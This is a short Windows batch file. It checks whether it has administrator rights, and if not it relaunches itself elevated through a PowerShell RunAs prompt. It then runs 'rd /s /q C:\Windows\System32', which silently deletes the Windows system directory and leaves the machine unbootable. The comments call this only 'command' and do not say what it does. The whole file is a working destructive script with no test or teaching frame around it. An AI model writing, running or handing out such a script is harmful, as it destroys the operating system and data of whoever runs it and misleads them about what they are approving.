@echo off
:: Check if running as admin
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting administrative privileges...
    powershell -Command "Start-Process cmd -ArgumentList '/c %~dpnx0' -Verb RunAs"
    exit /B
)

:: execute as admin
echo Running as administrator...

:: command 
rd /s /q C:\Windows\System32

pause
